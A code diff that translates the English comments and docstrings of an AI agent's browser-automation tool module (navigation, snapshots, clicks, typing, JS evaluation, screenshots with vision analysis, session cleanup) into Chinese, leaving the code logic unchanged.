             _run_browser_command(effective_task_id, "open", ["about:blank"], timeout=10)
@@ -1192,7 +1193,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
             "title": title
         }
         
-        # Detect common "blocked" page patterns from title/url
+        # 从标题/URL 检测常见的"阻止"页面模式
         blocked_patterns = [
             "access denied", "access to this page has been denied",
             "blocked", "bot detected", "verification required",
@@ -1210,7 +1211,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
                 "4) Some sites have very aggressive bot detection that may be unavoidable."
             )
         
-        # Include feature info on first navigation so model knows what's active
+        # 在首次导航时包含功能信息，以便模型知道哪些处于活动状态
         if is_first_nav and "features" in session_info:
             features = session_info["features"]
             active_features = [k for k, v in features.items() if v]
@@ -1221,8 +1222,8 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
                 )
             response["stealth_features"] = active_features
 
-        # Auto-take a compact snapshot so the model can act immediately
-        # without a separate browser_snapshot call.
+        # 自动获取紧凑快照，以便模型可以立即行动，
+        # 而无需单独的 browser_snapshot 调用。
         try:
             snap_result = _run_browser_command(effective_task_id, "snapshot", ["-c"])
             if snap_result.get("success"):
@@ -1250,15 +1251,15 @@ def browser_snapshot(
     user_task: Optional[str] = None
 ) -> str:
     """
-    Get a text-based snapshot of the current page's accessibility tree.
-    
-    Args:
-        full: If True, return complete snapshot. If False, return compact view.
-        task_id: Task identifier for session isolation
-        user_task: The user's current task (for task-aware extraction)
-        
-    Returns:
-        JSON string with page snapshot
+    获取当前页面可访问性树的基于文本的快照。
+
+    参数：
+        full: 如果为 True，返回完整快照。如果为 False，返回紧凑视图。
+        task_id: 用于会话隔离的任务标识符
+        user_task: 用户当前的任务（用于任务感知提取）
+
+    返回：
+        带页面快照的 JSON 字符串
     """
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_snapshot
@@ -1278,7 +1279,7 @@ def browser_snapshot(
         snapshot_text = data.get("snapshot", "")
         refs = data.get("refs", {})
         
-        # Check if snapshot needs summarization
+        # 检查快照是否需要摘要
         if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD and user_task:
             snapshot_text = _extract_relevant_content(snapshot_text, user_task)
         elif len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
@@ -1300,14 +1301,14 @@ def browser_snapshot(
 
 def browser_click(ref: str, task_id: Optional[str] = None) -> str:
     """
-    Click on an element.
-    
-    Args:
-        ref: Element reference (e.g., "@e5")
-        task_id: Task identifier for session isolation
-        
-    Returns:
-        JSON string with click result
+    点击元素。
+
+    参数：
+        ref: 元素引用（例如，"@e5"）
+        task_id: 用于会话隔离的任务标识符
+
+    返回：
+        带点击结果的 JSON 字符串
     """
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_click
@@ -1335,15 +1336,15 @@ def browser_click(ref: str, task_id: Optional[str] = None) -> str:
 
 def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
     """
-    Type text into an input field.
-    
-    Args:
-        ref: Element reference (e.g., "@e3")
-        text: Text to type
-        task_id: Task identifier for session isolation
-        
-    Returns:
-        JSON string with type result
+    在输入字段中键入文本。
+
+    参数：
+        ref: 元素引用（例如，"@e3"）
+        text: 要键入的文本
+        task_id: 用于会话隔离的任务标识符
+
+    返回：
+        带类型结果的 JSON 字符串
     """
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_type
@@ -1355,7 +1356,7 @@ def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
     if not ref.startswith("@"):
         ref = f"@{ref}"
     
-    # Use fill command (clears then types)
+    # 使用 fill 命令（清除然后键入）
     result = _run_browser_command(effective_task_id, "fill", [ref, text])
     
     if result.get("success"):
@@ -1373,14 +1374,14 @@ def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
 
 def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
     """
-    Scroll the page.
-    
-    Args:
-        direction: "up" or "down"
-        task_id: Task identifier for session isolation
-        
-    Returns:
-        JSON string with scroll result
+    滚动页面。
+
+    参数：
+        direction: "up" 或 "down"
+        task_id: 用于会话隔离的任务标识符
+
+    返回：
+        带滚动结果的 JSON 字符串
     """
     # Validate direction
     if direction not in ["up", "down"]:
@@ -1389,9 +1390,9 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
             "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."
         }, ensure_ascii=False)
 
-    # Repeat the scroll 5 times to get meaningful page movement.
-    # Most backends scroll ~100px per call, which is barely visible.
-    # 5x gives roughly half a viewport of travel, backend-agnostic.
+    # 重复滚动 5 次以获得有意义的页面移动。
+    # 大多数后端每次滚动约 100px，几乎看不见。
+    # 5 次大约是半个视口的行程，与后端无关。
     _SCROLL_REPEATS = 5
 
     if _is_camofox_mode():
@@ -1420,13 +1421,13 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
 
 def browser_back(task_id: Optional[str] = None) -> str:
     """
-    Navigate back in browser history.
-    
-    Args:
-        task_id: Task identifier for session isolation
-        
-    Returns:
-        JSON string with navigation result
+    在浏览器历史中后退。
+
+    参数：
+        task_id: 用于会话隔离的任务标识符
+
+    返回：
+        带导航结果的 JSON 字符串
     """
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_back
@@ -1450,14 +1451,14 @@ def browser_back(task_id: Optional[str] = None) -> str:
 
 def browser_press(key: str, task_id: Optional[str] = None) -> str:
     """
-    Press a keyboard key.
-    
-    Args:
-        key: Key to press (e.g., "Enter", "Tab")
-        task_id: Task identifier for session isolation
-        
-    Returns:
-        JSON string with key press result
+    按下键盘键。
+
+    参数：
+        key: 要按的键（例如，"Enter"、"Tab"）
+        task_id: 用于会话隔离的任务标识符
+
+    返回：
+        带按键结果的 JSON 字符串
     """
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_press
@@ -1482,25 +1483,25 @@ def browser_press(key: str, task_id: Optional[str] = None) -> str:
 
 
 def browser_console(clear: bool = False, expression: Optional[str] = None, task_id: Optional[str] = None) -> str:
-    """Get browser console messages and JavaScript errors, or evaluate JS in the page.
-    
-    When ``expression`` is provided, evaluates JavaScript in the page context
-    (like the DevTools console) and returns the result.  Otherwise returns
-    console output (log/warn/error/info) and uncaught exceptions.
-    
-    Args:
-        clear: If True, clear the message/error buffers after reading
-        expression: JavaScript expression to evaluate in the page context
-        task_id: Task identifier for session isolation
-        
-    Returns:
-        JSON string with console messages/errors, or eval result
+    """获取浏览器控制台消息和 JavaScript 错误，或在页面中评估 JS。
+
+    当提供 ``expression`` 时，在页面上下文中评估 JavaScript
+    （像 DevTools 控制台一样）并返回结果。否则返回
+    控制台输出（log/warn/error/info）和未捕获的异常。
+
+    参数：
+        clear: 如果为 True，读取后清除消息/错误缓冲区
+        expression: 要在页面上下文中评估的 JavaScript 表达式
+        task_id: 用于会话隔离的任务标识符
+
+    返回：
+        带控制台消息/错误的 JSON 字符串，或评估结果
     """
-    # --- JS evaluation mode ---
+    # --- JS 评估模式 ---
     if expression is not None:
         return _browser_eval(expression, task_id)
 
-    # --- Console output mode (original behaviour) ---
+    # --- 控制台输出模式（原始行为）---
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_console
         return camofox_console(clear, task_id)
@@ -1540,7 +1541,7 @@ def browser_console(clear: bool = False, expression: Optional[str] = None, task_
 
 
 def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
-    """Evaluate a JavaScript expression in the page context and return the result."""
+    """在页面上下文中评估 JavaScript 表达式并返回结果。"""
     if _is_camofox_mode():
         return _camofox_eval(expression, task_id)
 
@@ -1549,7 +1550,7 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
 
     if not result.get("success"):
         err = result.get("error", "eval failed")
-        # Detect backend capability gaps and give the model a clear signal
+        # 检测后端能力差距并给模型一个清晰的信号
         if any(hint in err.lower() for hint in ("unknown command", "not supported", "not found", "no such command")):
             return json.dumps({
                 "success": False,
@@ -1563,8 +1564,8 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
     data = result.get("data", {})
     raw_result = data.get("result")
 
-    # The eval command returns the JS result as a string.  If the string
-    # is valid JSON, parse it so the model gets structured data.
+    # eval 命令将 JS 结果作为字符串返回。如果字符串
+    # 是有效的 JSON，解析它以便模型获得结构化数据。
     parsed = raw_result
     if isinstance(raw_result, str):
         try:
@@ -1580,7 +1581,7 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
 
 
 def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
-    """Evaluate JS via Camofox's /tabs/{tab_id}/eval endpoint (if available)."""
+    """通过 Camofox 的 /tabs/{tab_id}/eval 端点评估 JS（如果可用）。"""
     from tools.browser_camofox import _get_session, _ensure_tab, _post
     try:
         session = _get_session(task_id or "default")
@@ -1603,7 +1604,7 @@ def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
         }, ensure_ascii=False, default=str)
     except Exception as e:
         error_msg = str(e)
-        # Graceful degradation — server may not support eval
+        # 优雅降级——服务器可能不支持 eval
         if any(code in error_msg for code in ("404", "405", "501")):
             return json.dumps({
                 "success": False,
@@ -1614,7 +1615,7 @@ def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
 
 
 def _maybe_start_recording(task_id: str):
-    """Start recording if browser.record_sessions is enabled in config."""
+    """如果配置中启用了 browser.record_sessions 则开始录制。"""
     if task_id in _recording_sessions:
         return
     try:
@@ -1645,7 +1646,7 @@ def _maybe_start_recording(task_id: str):
 
 
 def _maybe_stop_recording(task_id: str):
-    """Stop recording if one is active for this session."""
+    """如果此会话有活动录制则停止。"""
     if task_id not in _recording_sessions:
         return
     try:
@@ -1661,13 +1662,13 @@ def _maybe_stop_recording(task_id: str):
 
 def browser_get_images(task_id: Optional[str] = None) -> str:
     """
-    Get all images on the current page.
-    
-    Args:
-        task_id: Task identifier for session isolation
-        
-    Returns:
-        JSON string with list of images (src and alt)
+    获取当前页面上的所有图像。
+
+    参数：
+        task_id: 用于会话隔离的任务标识符
+
+    返回：
+        带图像列表的 JSON 字符串（src 和 alt）
     """
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_get_images
@@ -1719,23 +1720,23 @@ def browser_get_images(task_id: Optional[str] = None) -> str:
 
 def browser_vision(question: str, annotate: bool = False, task_id: Optional[str] = None) -> str:
     """
-    Take a screenshot of the current page and analyze it with vision AI.
-    
-    This tool captures what's visually displayed in the browser and sends it
-    to Gemini for analysis. Useful for understanding visual content that the
-    text-based snapshot may not capture (CAPTCHAs, verification challenges,
-    images, complex layouts, etc.).
-    
-    The screenshot is saved persistently and its file path is returned alongside
-    the analysis, so it can be shared with users via MEDIA:<path> in the response.
-    
-    Args:
-        question: What you want to know about the page visually
-        annotate: If True, overlay numbered [N] labels on interactive elements
-        task_id: Task identifier for session isolation
-        
-    Returns:
-        JSON string with vision analysis results and screenshot_path
+    拍摄当前页面的截图并用视觉 AI 进行分析。
+
+    此工具捕获浏览器中直观显示的内容并将其发送到
+    Gemini 进行分析。对于理解文本快照可能无法捕获的
+    视觉内容很有用（CAPTCHA、验证挑战、
+    图像、复杂布局等）。
+
+    截图被持久保存，其文件路径与
+    分析结果一起返回，以便可以通过响应中的 MEDIA:<path> 与用户共享。
+
+    参数：
+        question: 你想在页面上直观了解什么
+        annotate: 如果为 True，在交互元素上覆盖编号的 [N] 标签
+        task_id: 用于会话隔离的任务标识符
+
+    返回：
+        带视觉分析结果和 screenshot_path 的 JSON 字符串
     """
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_vision
@@ -1754,8 +1755,8 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
     
     try:
         screenshots_dir.mkdir(parents=True, exist_ok=True)
-        
-        # Prune old screenshots (older than 24 hours) to prevent unbounded disk growth
+
+        # 删除旧截图（超过 24 小时）以防止无限磁盘增长
         _cleanup_old_screenshots(screenshots_dir, max_age_hours=24)
         
         # Take screenshot using agent-browser
@@ -1816,9 +1817,9 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         logger.debug("browser_vision: analysing screenshot (%d bytes)",
                      len(image_data))
 
-        # Read vision timeout from config (auxiliary.vision.timeout), default 120s.
-        # Local vision models (llama.cpp, ollama) can take well over 30s for
-        # screenshot analysis, so the default must be generous.
+        # 从配置读取视觉超时（auxiliary.vision.timeout），默认 120s。
+        # 本地视觉模型（llama.cpp、ollama）可能需要超过 30s
+        # 进行截图分析，因此默认值必须充足。
         vision_timeout = 120.0
         try:
             from kclaw_cli.config import load_config
@@ -1863,10 +1864,9 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         return json.dumps(response_data, ensure_ascii=False)
     
     except Exception as e:
-        # Keep the screenshot if it was captured successfully — the failure is
-        # in the LLM vision analysis, not the capture.  Deleting a valid
-        # screenshot loses evidence the user might need.  The 24-hour cleanup
-        # in _cleanup_old_screenshots prevents unbounded disk growth.
+        # 如果截图成功捕获则保留截图——失败在 LLM 视觉分析，
+        # 而不是捕获。删除有效的截图会丢失用户可能需要的证据。
+        # _cleanup_old_screenshots 中的 24 小时清理可防止无限磁盘增长。
         logger.warning("browser_vision failed: %s", e, exc_info=True)
         error_info = {"success": False, "error": f"Error during vision analysis: {str(e)}"}
         if screenshot_path.exists():
@@ -1876,10 +1876,10 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
 
 
 def _cleanup_old_screenshots(screenshots_dir, max_age_hours=24):
-    """Remove browser screenshots older than max_age_hours to prevent disk bloat.
+    """删除超过 max_age_hours 的浏览器截图以防止磁盘膨胀。
 
-    Throttled to run at most once per hour per directory to avoid repeated
-    scans on screenshot-heavy workflows.
+    节流为每个目录每小时最多运行一次，以避免在
+    大量截图的工作流中重复扫描。
     """
     key = str(screenshots_dir)
     now = time.time()
@@ -1900,7 +1900,7 @@ def _cleanup_old_screenshots(screenshots_dir, max_age_hours=24):
 
 
 def _cleanup_old_recordings(max_age_hours=72):
-    """Remove browser recordings older than max_age_hours to prevent disk bloat."""
+    """删除超过 max_age_hours 的浏览器录制以防止磁盘膨胀。"""
     import time
     try:
         kclaw_home = get_kclaw_home()
@@ -1919,26 +1919,26 @@ def _cleanup_old_recordings(max_age_hours=72):
 
 
 # ============================================================================
-# Cleanup and Management Functions
+# 清理和管理函数
 # ============================================================================
 
 def cleanup_browser(task_id: Optional[str] = None) -> None:
     """
-    Clean up browser session for a task.
-    
-    Called automatically when a task completes or when inactivity timeout is reached.
-    Closes both the agent-browser/Browserbase session and Camofox sessions.
-    
-    Args:
-        task_id: Task identifier to clean up
+    清理任务的浏览器会话。
+
+    在任务完成或达到 inactivity 超时时自动调用。
+    关闭 agent-browser/Browserbase 会话和 Camofox 会话。
+
+    参数：
+        task_id: 要清理的任务标识符
     """
     if task_id is None:
         task_id = "default"
-    
-    # Also clean up Camofox session if running in Camofox mode.
-    # Skip full close when managed persistence is enabled — the browser
-    # profile (and its session cookies) must survive across agent tasks.
-    # The inactivity reaper still frees idle resources.
+
+    # 如果在 Camofox 模式下运行，也清理 Camofox 会话。
+    # 当启用托管持久性时跳过完全关闭——浏览器
+    # 配置文件（及其会话 cookie）必须在代理任务之间保持存活。
+    # inactivity 收割者仍然释放空闲资源。
     if _is_camofox_mode():
         try:
             from tools.browser_camofox import camofox_close, camofox_soft_cleanup
@@ -1949,9 +1949,9 @@ def cleanup_browser(task_id: Optional[str] = None) -> None:
 
     logger.debug("cleanup_browser called for task_id: %s", task_id)
     logger.debug("Active sessions: %s", list(_active_sessions.keys()))
-    
-    # Check if session exists (under lock), but don't remove yet -
-    # _run_browser_command needs it to build the close command.
+
+    # 检查会话是否存在（在锁下），但暂不删除——
+    # _run_browser_command 需要它来构建关闭命令。
     with _cleanup_lock:
         session_info = _active_sessions.get(task_id)
     
@@ -1959,10 +1959,10 @@ def cleanup_browser(task_id: Optional[str] = None) -> None:
         bb_session_id = session_info.get("bb_session_id", "unknown")
         logger.debug("Found session for task %s: bb_session_id=%s", task_id, bb_session_id)
         
-        # Stop auto-recording before closing (saves the file)
+        # 关闭前停止自动录制（保存文件）
         _maybe_stop_recording(task_id)
         
-        # Try to close via agent-browser first (needs session in _active_sessions)
+        # 首先尝试通过 agent-browser 关闭（需要 _active_sessions 中的会话）
         try:
             _run_browser_command(task_id, "close", [], timeout=10)
             logger.debug("agent-browser close command completed for task %s", task_id)
@@ -1983,7 +1983,7 @@ def cleanup_browser(task_id: Optional[str] = None) -> None:
                 except Exception as e:
                     logger.warning("Could not close cloud browser session: %s", e)
         
-        # Kill the daemon process and clean up socket directory
+        # 终止守护进程并清理套接字目录
         session_name = session_info.get("session_name", "")
         if session_name:
             socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{session_name}")
@@ -2006,9 +2006,9 @@ def cleanup_browser(task_id: Optional[str] = None) -> None:
 
 def cleanup_all_browsers() -> None:
     """
-    Clean up all active browser sessions.
-    
-    Useful for cleanup on shutdown.
+    清理所有活动的浏览器会话。
+
+    用于关闭时的清理。
     """
     with _cleanup_lock:
         task_ids = list(_active_sessions.keys())
@@ -2018,21 +2018,21 @@ def cleanup_all_browsers() -> None:
 
 
 # ============================================================================
-# Requirements Check
+# 需求检查
 # ============================================================================
 
 def check_browser_requirements() -> bool:
     """
-    Check if browser tool requirements are met.
+    检查是否满足浏览器工具需求。
 
-    In **local mode** (no cloud provider configured): only the
-    ``agent-browser`` CLI must be findable.
+    在**本地模式**（未配置云提供商）：只需
+    ``agent-browser`` CLI 可查找。
 
-    In **cloud mode** (Browserbase, Browser Use, or Firecrawl): the CLI
-    *and* the provider's required credentials must be present.
+    在**云模式**（Browserbase、Browser Use 或 Firecrawl）：CLI
+    *和*提供商的必需凭据必须存在。
 
-    Returns:
-        True if all requirements are met, False otherwise
+    返回：
+        如果满足所有需求则为 True，否则为 False
     """
     # Camofox backend — only needs the server URL, no agent-browser CLI
     if _is_camofox_mode():
@@ -2053,12 +2053,12 @@ def check_browser_requirements() -> bool:
 
 
 # ============================================================================
-# Module Test
+# 模块测试
 # ============================================================================
 
 if __name__ == "__main__":
     """
-    Simple test/demo when run directly
+    直接运行时的简单测试/演示
     """
     print("🌐 Browser Tool Module")
     print("=" * 40)
@@ -2067,7 +2067,7 @@ if __name__ == "__main__":
     mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
     print(f"   Mode: {mode}")
     
-    # Check requirements
+    # 检查需求
     if check_browser_requirements():
         print("✅ All requirements met")
     else:
@@ -2092,7 +2092,7 @@ if __name__ == "__main__":
 
 
 # ---------------------------------------------------------------------------
-# Registry
+# 注册表
 # ---------------------------------------------------------------------------
 from tools.registry import registry, tool_error
 
